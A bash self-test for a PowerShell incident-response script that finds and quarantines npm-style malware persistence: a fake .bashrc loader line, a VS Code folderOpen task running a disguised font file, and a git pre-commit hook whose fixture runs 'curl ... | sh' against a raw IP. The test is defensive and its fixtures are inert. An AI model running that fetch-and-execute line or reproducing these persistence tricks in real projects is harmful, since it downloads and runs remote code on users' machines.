#!/usr/bin/env bash
# Tests for live-respond.ps1 using PowerShell 7 on Linux/macOS (CI has pwsh). Windows-only
# parts (Run keys, scheduled tasks, Startup .lnk, CIM process list) cannot be exercised here;
# the process, file, tasks.json, git-hook, quarantine, restore and verdict logic is shared code.
# Everything is harmless: fake processes are perl copies named node that only sleep.
# shellcheck disable=SC2016,SC2009
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd -P)"
ROOT="$(cd "${HERE}/.." && pwd -P)"
if ! command -v pwsh >/dev/null 2>&1; then echo "SKIP pwsh not installed"; echo "----"; echo "passed=0 failed=0 (skipped)"; exit 0; fi
T="$(mktemp -d "${TMPDIR:-/tmp}/live-ps1-selftest.XXXXXX")"
PIDS=()
cleanup() { for p in "${PIDS[@]:-}"; do [[ -n "${p}" ]] && kill -9 "${p}" 2>/dev/null; done; [[ -n "${KEEP:-}" ]] || rm -rf "${T}"; }
trap cleanup EXIT
pass=0 fail=0
ok()  { pass=$((pass+1)); printf 'PASS %s\n' "$1"; }
bad() { fail=$((fail+1)); printf 'FAIL %s\n' "$1"; }
check() { if eval "$2"; then ok "$1"; else bad "$1"; [[ -n "${3:-}" && -f "${3}" ]] && sed 's/^/    | /' "$3" | head -40; fi; }
alive() { kill -0 "$1" 2>/dev/null && [[ "$(ps -o stat= -p "$1" 2>/dev/null | tr -d ' ')" != Z* ]]; }
gone() { local _; for _ in 1 2 3 4 5 6 7 8 9 10; do alive "$1" || return 0; sleep 0.3; done; return 1; }
visible() { local _; for _ in $(seq 1 30); do ps -axww -o pid=,command= 2>/dev/null | grep -q "^ *$1 " && return 0; sleep 0.1; done; return 1; }
BIN="${T}/bin"; mkdir -p "${BIN}"; ln -s "$(command -v perl)" "${BIN}/node"
FH="${T}/home"; mkdir -p "${FH}"
PS1=("${ROOT}/live-respond.ps1" -Isolated -HomeDir "${FH}" -NoHistory -QuarantineRoot "${T}/q")
run() { pwsh -NoProfile -File "${PS1[0]}" "${PS1[@]:1}" "$@"; }

"${BIN}/node" -e 'sleep 300; # console.log("a normal one-liner")' & B1=$!; PIDS+=("${B1}"); disown "${B1}"
"${BIN}/node" -e 'sleep 300; # fetch("https://ethereum-rpc.publicnode.com") // web3 balance check without eval' & B2=$!; PIDS+=("${B2}"); disown "${B2}"
visible "${B1}"; visible "${B2}"
run -NoRepos > "${T}/benign.out" 2>&1; rc=$?
check "ps1: benign node processes: SAFE, exit 0" "[[ ${rc} -eq 0 ]] && grep -q 'SAFE TO ROTATE CREDENTIALS' '${T}/benign.out' && grep -q 'none matched' '${T}/benign.out'" "${T}/benign.out"
kill -9 "${B1}" "${B2}" 2>/dev/null

"${BIN}/node" -e "sleep 300; # global.i='A9-1403-4';" & M1=$!; PIDS+=("${M1}"); disown "${M1}"
cat > "${T}/temp_auto_push.sh" <<'SH'
#!/usr/bin/env bash
sleep 300 &
echo $! > "$1"
wait
SH
bash "${T}/temp_auto_push.sh" "${T}/child.pid" & M2=$!; PIDS+=("${M2}"); disown "${M2}"
visible "${M1}"; visible "${M2}"
for _ in $(seq 1 30); do [[ -s "${T}/child.pid" ]] && break; sleep 0.1; done
CHILD="$(cat "${T}/child.pid")"; PIDS+=("${CHILD}")
run -NoRepos > "${T}/mal.out" 2>&1; rc=$?
check "ps1: loader and auto-push script detected, NOT SAFE YET, exit 2" "[[ ${rc} -eq 2 ]] && grep -qE 'HIGH +pid ${M1} ' '${T}/mal.out' && grep -qE 'HIGH +pid ${M2} ' '${T}/mal.out' && grep -q 'NOT SAFE YET' '${T}/mal.out'" "${T}/mal.out"
check "ps1: report-only leaves processes running" "alive ${M1} && alive ${M2}"
run -NoRepos -Kill > "${T}/kill.out" 2>&1; rc=$?
check "ps1: -Kill stops them and the script's child; verdict SAFE" "gone ${M1} && gone ${M2} && gone ${CHILD} && [[ ${rc} -eq 0 ]] && grep -q 'SAFE TO ROTATE' '${T}/kill.out'" "${T}/kill.out"
check "ps1: rotation checklist printed" "grep -q 'Rotation checklist' '${T}/kill.out' && grep -q 'cannot undo' '${T}/kill.out'"

mkdir -p "${FH}/.node_modules/node_modules/axios" "${FH}/.node_modules/node_modules/socket.io-client" "${FH}/.npl" "${FH}/work/proj/.vscode" "${FH}/work/clean/.vscode" "${FH}/hooks2"
printf 'x\n' > "${FH}/.node_modules/node_modules/axios/index.js"; printf 'inert\n' > "${FH}/.npl/loader.js"
printf 'export PATH="$HOME/bin:$PATH"\n(node ~/.npl/loader.js &)\nalias gs="git status"\n' > "${FH}/.bashrc"
printf '{ "version": "2.0.0", "tasks": [ { "label": "eslint", "type": "shell", "command": "node public/fonts/fa-solid-400.woff2", "presentation": { "reveal": "never" }, "runOptions": { "runOn": "folderOpen" } } ] }\n' > "${FH}/work/proj/.vscode/tasks.json"
printf '{ "name": "proj" }\n' > "${FH}/work/proj/package.json"
printf '{ "version": "2.0.0", "tasks": [ { "label": "watch", "type": "shell", "command": "npm run watch", "runOptions": { "runOn": "folderOpen" } } ] }\n' > "${FH}/work/clean/.vscode/tasks.json"
printf '{ "name": "clean" }\n' > "${FH}/work/clean/package.json"
printf '@echo off\r\n' > "${FH}/work/proj/temp_auto_push.bat"
printf '#!/bin/sh\ncurl -s http://166.88.54.158:1224/boot | sh\n' > "${FH}/hooks2/pre-commit"
printf '[core]\n\thooksPath = %s/hooks2\n' "${FH}" > "${FH}/.gitconfig"
find "${FH}" -type f -exec sha256sum {} + | sort -k2 > "${T}/before.sha"
run -ScanDir "${FH}/work" > "${T}/inf.out" 2>&1; rc=$?
check "ps1: infected home flagged (artifacts, .node_modules, rc line, hook, auto-push file)" "[[ ${rc} -eq 2 ]] && grep -qE 'HIGH +${FH}/.npl' '${T}/inf.out' && grep -qE 'HIGH +${FH}/.node_modules' '${T}/inf.out' && grep -qE 'HIGH +${FH}/.bashrc' '${T}/inf.out' && grep -qE 'HIGH +${FH}/hooks2/pre-commit' '${T}/inf.out' && grep -q 'temp_auto_push.bat' '${T}/inf.out'" "${T}/inf.out"
check "ps1: folderOpen task running a fake font flagged; normal folderOpen npm task is not" "grep -qE 'HIGH +${FH}/work/proj/.vscode/tasks.json' '${T}/inf.out' && ! grep -q '${FH}/work/clean' '${T}/inf.out'"
find "${FH}" -type f -exec sha256sum {} + | sort -k2 > "${T}/after.sha"
check "ps1: report-only changed nothing" "diff -q '${T}/before.sha' '${T}/after.sha' >/dev/null && [[ ! -d '${T}/q' ]]"
run -ScanDir "${FH}/work" -Quarantine > "${T}/quar.out" 2>&1; rc=$?
QD="$(find "${T}/q" -mindepth 1 -maxdepth 1 -type d | head -1)"
check "ps1: -Quarantine moves items, writes manifest, verdict SAFE" "[[ ${rc} -eq 0 && -f '${QD}/manifest.json' && ! -e '${FH}/.npl' && ! -e '${FH}/.node_modules' && ! -e '${FH}/hooks2/pre-commit' && ! -e '${FH}/work/proj/.vscode/tasks.json' ]] && grep -q 'SAFE TO ROTATE' '${T}/quar.out'" "${T}/quar.out"
check "ps1: rc file keeps benign lines, bad line commented out" "grep -q 'alias gs=' '${FH}/.bashrc' && grep -q '# polinrider-guard disabled' '${FH}/.bashrc'"
check "ps1: manifest has original paths and sha256" "python3 -c \"import json; m=json.load(open('${QD}/manifest.json')); e=[x for x in m['entries'] if x['type']=='move']; assert len(e)>=5 and all(x['original'] and (x.get('sha256') or x.get('files')) for x in e)\""
run -Restore "${QD}" > /dev/null 2>&1; rc=$?
check "ps1: -Restore without -Yes refuses" "[[ ${rc} -eq 3 && ! -e '${FH}/.npl' ]]"
run -Restore "${QD}" -Yes > "${T}/rest.out" 2>&1; rc=$?
find "${FH}" -type f -exec sha256sum {} + | sort -k2 > "${T}/after_restore.sha"
check "ps1: -Restore -Yes restores byte-identical files" "[[ ${rc} -eq 0 ]] && diff -q '${T}/before.sha' '${T}/after_restore.sha' >/dev/null" "${T}/rest.out"

echo "----"; echo "passed=${pass} failed=${fail}"
[[ ${fail} -eq 0 ]]
